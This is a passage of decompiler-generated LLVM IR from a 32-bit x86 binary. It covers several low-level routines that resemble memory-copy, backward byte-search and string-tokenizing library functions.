  %v2_80545b9 = add i32 %v0_80545b9, %v0_80545b1
  store i32 %v2_80545b9, i32* %edi.global-to-local, align 4
  %v1_80545bb = load i32, i32* %esi.global-to-local, align 4
  %v7_80545bb = icmp ult i32 %v1_80545b6, %v1_80545bb
  br i1 %v7_80545bb, label %dec_label_pc_8054598, label %dec_label_pc_80545bf

dec_label_pc_80545bf:                             ; preds = %dec_label_pc_80545b6, %dec_label_pc_8054587
  %v0_80545c5 = phi i32 [ -1, %dec_label_pc_8054587 ], [ %v2_80545b9, %dec_label_pc_80545b6 ]
  store i32 %v0_80545c5, i32* %eax.global-to-local, align 4
  %v2_80545c8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80545c8, i32* @esi, align 4
  store i32 %v0_805400a, i32* @edi, align 4
  store i32 %v0_8054009, i32* @ebp, align 4
  ret i32 %v0_80545c5

; uselistorder directives
  uselistorder i32 %v0_80545c5, { 1, 0 }
  uselistorder i32 %v1_8054515, { 1, 2, 0 }
  uselistorder i32 %v0_8054513, { 1, 0 }
  uselistorder i32 %v0_8054590, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v0_80544e6, { 1, 0 }
  uselistorder i32 %v9_80544dd, { 1, 2, 3, 0 }
  uselistorder i32 %v0_80544d5, { 1, 0 }
  uselistorder i32 %v0_80544a7, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8054480, { 1, 0 }
  uselistorder i32 %v1_8054480, { 1, 0, 2 }
  uselistorder i32 %v2_805447e, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_80543b4, { 2, 1, 3, 0 }
  uselistorder i32 %v2_805439a, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_80543ff, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v0_8054365, { 0, 2, 1 }
  uselistorder i32 %v1_805433e, { 1, 0 }
  uselistorder i32 %v0_8054339, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8054306, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_8054301, { 1, 0 }
  uselistorder i8 %v2_80542fa, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_80542fa, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8054284, { 1, 2, 0 }
  uselistorder i8 %stack_var_-206.0.v4_8054270, { 1, 3, 0, 4, 2 }
  uselistorder i8 %v4_8054269, { 1, 0 }
  uselistorder i32 %v1_8054255, { 1, 0 }
  uselistorder i32 %v0_8054249, { 1, 0 }
  uselistorder i32 %v4_8054230, { 1, 0 }
  uselistorder i32 %tmp150, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_8054235, { 1, 0 }
  uselistorder i32 %v2_80541f3, { 1, 0, 2 }
  uselistorder i3 %v1_80540a9, { 1, 0 }
  uselistorder i32 %v3_8054067, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_8054067, { 1, 0, 2 }
  uselistorder i8 %stack_var_-206.0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_8054039, { 1, 0 }
  uselistorder i32 %v3_8054027, { 1, 0, 2 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp111, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 1, 2, 4, 3 }
  uselistorder x86_fp80* %st1.global-to-local, { 1, 0, 2 }
  uselistorder x86_fp80* %st0.global-to-local, { 0, 2, 3, 1 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 5, 4, 6, 7, 1, 8, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 9, 11, 10, 8, 12, 13, 14, 15 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 5, 6, 9, 13, 12, 14, 10, 11, 15, 18, 16, 19, 17, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 4, 5, 3, 6, 7, 8, 9, 23, 10, 11, 24, 13, 14, 12, 18, 15, 16, 17, 19, 20, 21, 22 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 2, 6, 7, 3, 8, 10, 4, 9, 5, 11 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 4, 5, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i32 165, { 1, 0 }
  uselistorder i32 21, { 1, 2, 0 }
  uselistorder i8 102, { 4, 1, 0, 3, 2 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i32 69, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8054592, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054590, { 1, 0 }
  uselistorder label %dec_label_pc_805450f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80544c1, { 1, 0 }
  uselistorder label %dec_label_pc_8054499, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054468, { 1, 0 }
  uselistorder label %dec_label_pc_8054455, { 1, 0 }
  uselistorder label %dec_label_pc_805443b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054408, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80543f3, { 1, 0 }
  uselistorder label %dec_label_pc_80543e8, { 1, 0 }
  uselistorder label %dec_label_pc_805436f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054361, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054327, { 1, 0 }
  uselistorder label %dec_label_pc_80542f7.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_80542c3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054292, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8054058, { 1, 0 }
  uselistorder label %dec_label_pc_805404f, { 1, 0 }
}

define i32 @function_80545cc(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80545cc:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_80545ce = load i32, i32* @ebx, align 4
  %v12_80545cf = ptrtoint i32* %stack_var_-28 to i32
  %v4_80545d2 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80545d2, i32* @esi, align 4
  %v1_80545d6 = add i32 %v4_80545d2, 52
  %v2_80545d6 = inttoptr i32 %v1_80545d6 to i32*
  %v3_80545d6 = load i32, i32* %v2_80545d6, align 4
  store i32 %v3_80545d6, i32* @edi, align 4
  %v1_80545d9 = icmp eq i32 %v3_80545d6, 0
  %v1_80545db = icmp eq i1 %v1_80545d9, false
  br i1 %v1_80545db, label %dec_label_pc_80545fc, label %dec_label_pc_80545dd

dec_label_pc_80545dd:                             ; preds = %dec_label_pc_80545cc
  %v1_80545dd = add i32 %v4_80545d2, 56
  store i32 %v1_80545dd, i32* @ebx, align 4
  store i32 %v12_80545cf, i32* @eax, align 4
  %v3_80545ec = call i32 @function_80535d2(i32 %v12_80545cf, i32 134559183)
  %v0_80545f1 = load i32, i32* @ebx, align 4
  %v2_80545f4 = call i32 @function_80535cf(i32 %v0_80545f1)
  %v0_80545fc.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80545fc

dec_label_pc_80545fc:                             ; preds = %dec_label_pc_80545cc, %dec_label_pc_80545dd
  %v0_8054612 = phi i32 [ %v4_80545d2, %dec_label_pc_80545cc ], [ %v0_80545fc.pre, %dec_label_pc_80545dd ]
  %v1_80545fc = inttoptr i32 %v0_8054612 to i16*
  %v2_80545fc = load i16, i16* %v1_80545fc, align 2
  %v1_80545ff = and i16 %v2_80545fc, 192
  %v6_8054604 = icmp eq i16 %v1_80545ff, 192
  br i1 %v6_8054604, label %dec_label_pc_80545fc.dec_label_pc_8054622_crit_edge, label %dec_label_pc_805460b

dec_label_pc_80545fc.dec_label_pc_8054622_crit_edge: ; preds = %dec_label_pc_80545fc
  br label %dec_label_pc_8054622

dec_label_pc_805460b:                             ; preds = %dec_label_pc_80545fc
  %v0_805460b = load i32, i32* @ecx, align 4
  %v6_8054613 = call i32 @function_8053dfc(i16* %v1_80545fc, i32 128, i32 %v0_805460b, i32 %v0_805460b)
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_805461e = icmp eq i32 %v6_8054613, 0
  %v1_8054620 = icmp eq i1 %v1_805461e, false
  br i1 %v1_8054620, label %dec_label_pc_8054636, label %dec_label_pc_805460b.dec_label_pc_8054622_crit_edge

dec_label_pc_805460b.dec_label_pc_8054622_crit_edge: ; preds = %dec_label_pc_805460b
  %v0_805462b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8054622

dec_label_pc_8054622:                             ; preds = %dec_label_pc_80545fc.dec_label_pc_8054622_crit_edge, %dec_label_pc_805460b.dec_label_pc_8054622_crit_edge
  %v0_805462b = phi i32 [ %v0_8054612, %dec_label_pc_80545fc.dec_label_pc_8054622_crit_edge ], [ %v0_805462b.pre, %dec_label_pc_805460b.dec_label_pc_8054622_crit_edge ]
  %v0_8054622 = load i32, i32* @edx, align 4
  %v5_805462c = inttoptr i32 %arg2 to i8*
  %v6_805462c = call i32 @function_8050810(i32 %v0_805462b, i8* %v5_805462c, i32 %arg3, i32 %v0_8054622)
  store i32 %v6_805462c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054636

dec_label_pc_8054636:                             ; preds = %dec_label_pc_805460b, %dec_label_pc_8054622
  %v0_805464e7 = phi i32 [ -1, %dec_label_pc_805460b ], [ %v6_805462c, %dec_label_pc_8054622 ]
  br i1 %v1_80545db, label %dec_label_pc_805464b, label %dec_label_pc_805463a

dec_label_pc_805463a:                             ; preds = %dec_label_pc_8054636
  store i32 %v12_80545cf, i32* @eax, align 4
  %v3_8054643 = call i32 @function_80535d2(i32 %v12_80545cf, i32 1)
  %v0_805464e.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805464b

dec_label_pc_805464b:                             ; preds = %dec_label_pc_8054636, %dec_label_pc_805463a
  %v0_805464e = phi i32 [ %v0_805464e7, %dec_label_pc_8054636 ], [ %v0_805464e.pre, %dec_label_pc_805463a ]
  store i32 %v0_80545ce, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805464e

; uselistorder directives
  uselistorder i32 %v12_80545cf, { 2, 3, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i8*, i32, i32)* @function_8050810, { 1, 0 }
  uselistorder i32 (i16*, i32, i32, i32)* @function_8053dfc, { 1, 0 }
  uselistorder label %dec_label_pc_805464b, { 1, 0 }
  uselistorder label %dec_label_pc_8054636, { 1, 0 }
  uselistorder label %dec_label_pc_8054622, { 1, 0 }
  uselistorder label %dec_label_pc_80545fc, { 1, 0 }
}

define i32 @function_8054654(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8054654:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8054654 = load i32, i32* @edi, align 4
  store i32 %v0_8054654, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_805465b = ptrtoint i8* %arg1 to i32
  store i32 %v4_805465b, i32* %edi.global-to-local, align 4
  %v1_8054663 = icmp eq i32 %arg3, 0
  store i1 %v1_8054663, i1* %zf.global-to-local, align 1
  br i1 %v1_8054663, label %dec_label_pc_8054673, label %dec_label_pc_8054667

dec_label_pc_8054667:                             ; preds = %dec_label_pc_8054654
  %v2_8054667 = call i32 @_strlen(i8* %arg1)
  %v3_8054667 = mul i32 %v2_8054667, -1
  %v4_8054667 = add i32 %v3_8054667, -2
  store i32 %v4_8054667, i32* @ecx, align 4
  %v0_8054669 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8054669, label %dec_label_pc_8054667.dec_label_pc_8054670_crit_edge, label %dec_label_pc_805466b

dec_label_pc_8054667.dec_label_pc_8054670_crit_edge: ; preds = %dec_label_pc_8054667
  %v0_8054670.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_8054670.pre, -1
  br label %dec_label_pc_8054670

dec_label_pc_805466b:                             ; preds = %dec_label_pc_8054667
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8054670

dec_label_pc_8054670:                             ; preds = %dec_label_pc_8054667.dec_label_pc_8054670_crit_edge, %dec_label_pc_805466b
  %v0_8054670 = phi i32 [ %phitmp, %dec_label_pc_8054667.dec_label_pc_8054670_crit_edge ], [ 0, %dec_label_pc_805466b ]
  %v8_8054670 = icmp eq i32 %v0_8054670, 0
  store i1 %v8_8054670, i1* %zf.global-to-local, align 1
  store i32 %v0_8054670, i32* %edi.global-to-local, align 4
  %v2_8054675.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054673

dec_label_pc_8054673:                             ; preds = %dec_label_pc_8054654, %dec_label_pc_8054670
  %v2_8054675 = phi i32 [ %v0_8054654, %dec_label_pc_8054654 ], [ %v2_8054675.pre, %dec_label_pc_8054670 ]
  %v0_8054673 = phi i32 [ 0, %dec_label_pc_8054654 ], [ %v0_8054670, %dec_label_pc_8054670 ]
  store i32 %v2_8054675, i32* @edi, align 4
  ret i32 %v0_8054673

; uselistorder directives
  uselistorder i32 %v0_8054670, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8054673, { 1, 0 }
  uselistorder label %dec_label_pc_8054670, { 1, 0 }
}

define i32 @function_8054678(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8054678:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %v4_805467a = ptrtoint i8* %arg1 to i32
  %v9_8054686 = icmp ugt i8* %tmp3, %arg1
  %v1_8054688 = icmp eq i1 %v9_8054686, false
  br i1 %v1_8054688, label %dec_label_pc_8054690, label %dec_label_pc_805468a

dec_label_pc_805468a:                             ; preds = %dec_label_pc_8054678
  %v7_805468c = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_805469c

dec_label_pc_8054690:                             ; preds = %dec_label_pc_8054678
  %v3_8054690 = add i32 %arg2, -1
  %v4_8054690 = add i32 %v3_8054690, %tmp
  %v5_8054690 = inttoptr i32 %v4_8054690 to i8*
  %v3_8054694 = add i32 %v4_805467a, -1
  %v4_8054694 = add i32 %v3_8054694, %tmp
  %v5_8054694 = inttoptr i32 %v4_8054694 to i8*
  %v7_8054699 = call i8* @_memcpy(i8* %v5_8054694, i8* %v5_8054690, i32 %tmp)
  br label %dec_label_pc_805469c

dec_label_pc_805469c:                             ; preds = %dec_label_pc_805468a, %dec_label_pc_8054690
  ret i32 %v4_805467a

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805469c, { 1, 0 }
}

define i32 @function_80546a0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80546a0:
  %v0_80546a0 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_80546b3 = inttoptr i32 %arg1 to i16*
  %v4_80546b3 = call i32 @function_8051414(i16* %v3_80546b3, i32 %arg2, i32 %arg3)
  %v0_80546b8 = load i32, i32* @esi, align 4
  %v2_80546b8 = add i32 %v0_80546b8, %arg3
  store i32 %v0_80546a0, i32* @esi, align 4
  ret i32 %v2_80546b8
}

define i32 @function_80546c4(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80546c4:
  %tmp = trunc i32 %arg2 to i8
  %v4_80546c9 = urem i32 %arg2, 256
  %v4_80546d5 = sext i8 %arg1 to i32
  %v2_80546d9 = add i32 %v4_80546d5, %arg3
  %v1_80546eb7 = icmp eq i32 %arg3, 0
  br i1 %v1_80546eb7, label %dec_label_pc_80546f3, label %dec_label_pc_80546ef

dec_label_pc_80546dd:                             ; preds = %dec_label_pc_80546ef
  %v1_80546dd = add i32 %v0_80546dd, -1
  %v5_80546de = load i32, i32* @edx, align 4
  %v6_80546de = and i32 %v5_80546de, -256
  %v7_80546de = or i32 %v6_80546de, %v4_80546c9
  store i32 %v7_80546de, i32* @edx, align 4
  %v1_80546e2 = inttoptr i32 %v1_80546dd to i8*
  %v2_80546e2 = load i8, i8* %v1_80546e2, align 1
  %v15_80546e2 = icmp eq i8 %v2_80546e2, %tmp
  br i1 %v15_80546e2, label %dec_label_pc_8054770, label %dec_label_pc_80546ea

dec_label_pc_80546ea:                             ; preds = %dec_label_pc_80546dd
  %v1_80546ea = add i32 %v0_80546ea, -1
  %v8_80546ea = icmp eq i32 %v1_80546ea, 0
  br i1 %v8_80546ea, label %dec_label_pc_80546f3, label %dec_label_pc_80546ef

dec_label_pc_80546ef:                             ; preds = %dec_label_pc_80546c4, %dec_label_pc_80546ea
  %v0_80546ea = phi i32 [ %v1_80546ea, %dec_label_pc_80546ea ], [ %arg3, %dec_label_pc_80546c4 ]
  %v0_80546dd = phi i32 [ %v1_80546dd, %dec_label_pc_80546ea ], [ %v2_80546d9, %dec_label_pc_80546c4 ]
  %v2_80546ef = urem i32 %v0_80546dd, 4
  %v3_80546ef = icmp eq i32 %v2_80546ef, 0
  %v1_80546f1 = icmp eq i1 %v3_80546ef, false
  br i1 %v1_80546f1, label %dec_label_pc_80546dd, label %dec_label_pc_80546f3

dec_label_pc_80546f3:                             ; preds = %dec_label_pc_80546ea, %dec_label_pc_80546ef, %dec_label_pc_80546c4
  %v0_8054756.pr = phi i32 [ 0, %dec_label_pc_80546c4 ], [ 0, %dec_label_pc_80546ea ], [ %v0_80546ea, %dec_label_pc_80546ef ]
  %v0_80546f8 = phi i32 [ %v2_80546d9, %dec_label_pc_80546c4 ], [ %v1_80546dd, %dec_label_pc_80546ea ], [ %v0_80546dd, %dec_label_pc_80546ef ]
  store i32 %v0_80546f8, i32* @ecx, align 4
  %v2_80546fc = mul nuw nsw i32 %v4_80546c9, 256
  %v2_80546ff = or i32 %v2_80546fc, %v4_80546c9
  %v2_8054703 = mul i32 %v2_80546ff, 65536
  %v2_8054706 = or i32 %v2_8054703, %v2_80546ff
  %v6_805475949 = icmp ugt i32 %v0_8054756.pr, 3
  br i1 %v6_805475949, label %dec_label_pc_805470a, label %dec_label_pc_805475b

dec_label_pc_805470a:                             ; preds = %dec_label_pc_80546f3, %dec_label_pc_8054753
  %v0_805475351 = phi i32 [ %v1_8054753, %dec_label_pc_8054753 ], [ %v0_8054756.pr, %dec_label_pc_80546f3 ]
  %v0_805470a50 = phi i32 [ %v1_805470a, %dec_label_pc_8054753 ], [ %v0_80546f8, %dec_label_pc_80546f3 ]
  %v1_805470a = add i32 %v0_805470a50, -4
  store i32 %v1_805470a, i32* @ecx, align 4
  %v2_805470f = inttoptr i32 %v1_805470a to i32*
  %v3_805470f = load i32, i32* %v2_805470f, align 4
  %v4_805470f = xor i32 %v3_805470f, %v2_8054706
  %v1_8054711 = add i32 %v4_805470f, 2130640639
  %v1_8054717 = sub i32 -1, %v4_805470f
  %v2_8054719 = xor i32 %v1_8054711, %v1_8054717
  %v1_805471b = and i32 %v2_8054719, -2130640640
  %v2_805471b = icmp eq i32 %v1_805471b, 0
  br i1 %v2_805471b, label %dec_label_pc_8054753, label %dec_label_pc_8054723

dec_label_pc_8054723:                             ; preds = %dec_label_pc_805470a
  %v7_8054723 = or i32 %v1_805471b, %v4_80546c9
  %v1_8054727 = add i32 %v0_805470a50, -1
  %v2_805472a = inttoptr i32 %v1_8054727 to i8*
  %v3_805472a = load i8, i8* %v2_805472a, align 1
  %v16_805472a = icmp eq i8 %v3_805472a, %tmp
  br i1 %v16_805472a, label %dec_label_pc_8054770, label %dec_label_pc_805472f

dec_label_pc_805472f:                             ; preds = %dec_label_pc_8054723
  %v1_8054733 = add i32 %v0_805470a50, -2
  %v2_8054736 = inttoptr i32 %v1_8054733 to i8*
  %v3_8054736 = load i8, i8* %v2_8054736, align 1
  %v16_8054736 = icmp eq i8 %v3_8054736, %tmp
  br i1 %v16_8054736, label %dec_label_pc_8054770, label %dec_label_pc_805473b

dec_label_pc_805473b:                             ; preds = %dec_label_pc_805472f
  %v1_805473f = add i32 %v0_805470a50, -3
  %v2_8054742 = inttoptr i32 %v1_805473f to i8*
  %v3_8054742 = load i8, i8* %v2_8054742, align 1
  %v16_8054742 = icmp eq i8 %v3_8054742, %tmp
  br i1 %v16_8054742, label %dec_label_pc_8054770, label %dec_label_pc_8054747

dec_label_pc_8054747:                             ; preds = %dec_label_pc_805473b
  %v1_805474b = inttoptr i32 %v1_805470a to i8*
  %v2_805474b = load i8, i8* %v1_805474b, align 1
  %v15_805474b = icmp eq i8 %v2_805474b, %tmp
  %v1_805474d = icmp eq i1 %v15_805474b, false
  br i1 %v1_805474d, label %dec_label_pc_8054753, label %dec_label_pc_805474f

dec_label_pc_805474f:                             ; preds = %dec_label_pc_8054747
  br label %dec_label_pc_8054770

dec_label_pc_8054753:                             ; preds = %dec_label_pc_8054747, %dec_label_pc_805470a
  %v5_805476027 = phi i32 [ %v7_8054723, %dec_label_pc_8054747 ], [ 0, %dec_label_pc_805470a ]
  %v1_8054753 = add i32 %v0_805475351, -4
  %v6_8054759 = icmp ugt i32 %v1_8054753, 3
  br i1 %v6_8054759, label %dec_label_pc_805470a, label %dec_label_pc_805475b

dec_label_pc_805475b:                             ; preds = %dec_label_pc_8054753, %dec_label_pc_80546f3
  %v5_805476026.lcssa = phi i32 [ %v4_80546c9, %dec_label_pc_80546f3 ], [ %v5_805476027, %dec_label_pc_8054753 ]
  %v0_805470a.lcssa = phi i32 [ %v0_80546f8, %dec_label_pc_80546f3 ], [ %v1_805470a, %dec_label_pc_8054753 ]
  %v0_8054753.lcssa = phi i32 [ %v0_8054756.pr, %dec_label_pc_80546f3 ], [ %v1_8054753, %dec_label_pc_8054753 ]
  br label %dec_label_pc_8054768

dec_label_pc_805475f:                             ; preds = %dec_label_pc_8054768
  %v1_8054768 = add i32 %v0_8054768, -1
  %v1_805475f = add i32 %v0_805475f, -1
  %v6_8054760 = and i32 %v5_8054760, -256
  %v7_8054760 = or i32 %v6_8054760, %v4_80546c9
  %v1_8054764 = inttoptr i32 %v1_805475f to i8*
  %v2_8054764 = load i8, i8* %v1_8054764, align 1
  %v15_8054764 = icmp eq i8 %v2_8054764, %tmp
  br i1 %v15_8054764, label %dec_label_pc_8054770, label %dec_label_pc_8054768

dec_label_pc_8054768:                             ; preds = %dec_label_pc_805475f, %dec_label_pc_805475b
  %v5_8054760 = phi i32 [ %v7_8054760, %dec_label_pc_805475f ], [ %v5_805476026.lcssa, %dec_label_pc_805475b ]
  %v0_805475f = phi i32 [ %v1_805475f, %dec_label_pc_805475f ], [ %v0_805470a.lcssa, %dec_label_pc_805475b ]
  %v0_8054768 = phi i32 [ %v1_8054768, %dec_label_pc_805475f ], [ %v0_8054753.lcssa, %dec_label_pc_805475b ]
  %v10_8054769 = icmp eq i32 %v0_8054768, 0
  %v1_805476c = icmp eq i1 %v10_8054769, false
  br i1 %v1_805476c, label %dec_label_pc_805475f, label %dec_label_pc_805476e

dec_label_pc_805476e:                             ; preds = %dec_label_pc_8054768
  br label %dec_label_pc_8054770

dec_label_pc_8054770:                             ; preds = %dec_label_pc_80546dd, %dec_label_pc_805473b, %dec_label_pc_805472f, %dec_label_pc_8054723, %dec_label_pc_805475f, %dec_label_pc_805474f, %dec_label_pc_805476e
  %v0_8054773 = phi i32 [ %v1_805470a, %dec_label_pc_805474f ], [ 0, %dec_label_pc_805476e ], [ %v1_805475f, %dec_label_pc_805475f ], [ %v1_805473f, %dec_label_pc_805473b ], [ %v1_8054733, %dec_label_pc_805472f ], [ %v1_8054727, %dec_label_pc_8054723 ], [ %v1_80546dd, %dec_label_pc_80546dd ]
  ret i32 %v0_8054773

; uselistorder directives
  uselistorder i32 %v0_8054768, { 1, 0 }
  uselistorder i32 %v1_8054753, { 0, 2, 1 }
  uselistorder i32 %v1_805470a, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_805470a50, { 3, 2, 1, 0 }
  uselistorder i32 %v2_80546ff, { 1, 0 }
  uselistorder i32 %v0_80546dd, { 1, 0, 2 }
  uselistorder i32 %v2_80546d9, { 1, 0 }
  uselistorder i32 %v4_80546c9, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8054770, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_805470a, { 1, 0 }
  uselistorder label %dec_label_pc_80546f3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80546ef, { 1, 0 }
}

define i32 @function_8054774(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8054774:
  %eax.global-to-local = alloca i32, align 4
  %v4_8054777 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054777, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8054783 = icmp eq i8* %arg1, null
  %v1_8054785 = icmp eq i1 %v1_8054783, false
  br i1 %v1_8054785, label %dec_label_pc_8054789, label %dec_label_pc_8054787

dec_label_pc_8054787:                             ; preds = %dec_label_pc_8054774
  %v1_8054787 = inttoptr i32 %arg3 to i32*
  %v2_8054787 = load i32, i32* %v1_8054787, align 4
  store i32 %v2_8054787, i32* @ebx, align 4
  br label %dec_label_pc_8054789

dec_label_pc_8054789:                             ; preds = %dec_label_pc_8054774, %dec_label_pc_8054787
  %v0_805478c = phi i32 [ %v4_8054777, %dec_label_pc_8054774 ], [ %v2_8054787, %dec_label_pc_8054787 ]
  %v0_8054789 = load i32, i32* @ecx, align 4
  %v5_805478c = inttoptr i32 %v0_805478c to i8*
  %v8_805478d = call i32 @function_8055bc8(i8* %v5_805478c, i32 %arg2, i32 %v0_8054789, i32 %v0_8054789)
  store i32 %v8_805478d, i32* %eax.global-to-local, align 4
  %v0_8054795 = load i32, i32* @ebx, align 4
  %v2_8054795 = add i32 %v0_8054795, %v8_805478d
  store i32 %v2_8054795, i32* @ebx, align 4
  %v1_8054797 = inttoptr i32 %v2_8054795 to i8*
  %v2_8054797 = load i8, i8* %v1_8054797, align 1
  %v3_8054797 = icmp eq i8 %v2_8054797, 0
  %v1_805479a = icmp eq i1 %v3_8054797, false
  br i1 %v1_805479a, label %dec_label_pc_80547a2, label %dec_label_pc_805479c

dec_label_pc_805479c:                             ; preds = %dec_label_pc_8054789
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805479e = load i32, i32* @esi, align 4
  %v2_805479e = inttoptr i32 %v1_805479e to i32*
  store i32 %v2_8054795, i32* %v2_805479e, align 4
  %v0_80547cc.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80547c9

dec_label_pc_80547a2:                             ; preds = %dec_label_pc_8054789
  %v0_80547a2 = load i32, i32* @edx, align 4
  %v0_80547a4 = load i32, i32* @edi, align 4
  %v8_80547a6 = call i32 @function_80547d0(i8* %v1_8054797, i32 %v0_80547a4, i32 %v0_80547a2, i32 %v0_80547a2)
  store i32 %v8_80547a6, i32* %eax.global-to-local, align 4
  %v2_80547ae = icmp eq i32 %v8_80547a6, 0
  %v1_80547b0 = icmp eq i1 %v2_80547ae, false
  br i1 %v1_80547b0, label %dec_label_pc_80547c1, label %dec_label_pc_80547b2

dec_label_pc_80547b2:                             ; preds = %dec_label_pc_80547a2
  %v0_80547b6 = load i32, i32* @ebx, align 4
  %v5_80547b6 = inttoptr i32 %v0_80547b6 to i8*
  %v8_80547b7 = call i32 @function_8055b64(i8* %v5_80547b6, i32 0, i32 %v8_80547a6, i32 %v8_80547a6)
  br label %dec_label_pc_80547c5

dec_label_pc_80547c1:                             ; preds = %dec_label_pc_80547a2
  %v9_80547a6 = inttoptr i32 %v8_80547a6 to i8*
  store i8 0, i8* %v9_80547a6, align 1
  %v2_80547c4 = add i32 %v8_80547a6, 1
  br label %dec_label_pc_80547c5

dec_label_pc_80547c5:                             ; preds = %dec_label_pc_80547b2, %dec_label_pc_80547c1
  %storemerge = phi i32 [ %v2_80547c4, %dec_label_pc_80547c1 ], [ %v8_80547b7, %dec_label_pc_80547b2 ]
  %v0_80547c5 = phi i32 [ %v2_80547c4, %dec_label_pc_80547c1 ], [ %v8_80547b7, %dec_label_pc_80547b2 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_80547c5 = load i32, i32* @esi, align 4
  %v2_80547c5 = inttoptr i32 %v1_80547c5 to i32*
  store i32 %v0_80547c5, i32* %v2_80547c5, align 4
  %v0_80547c7 = load i32, i32* @ebx, align 4
  store i32 %v0_80547c7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80547c9

dec_label_pc_80547c9:                             ; preds = %dec_label_pc_805479c, %dec_label_pc_80547c5
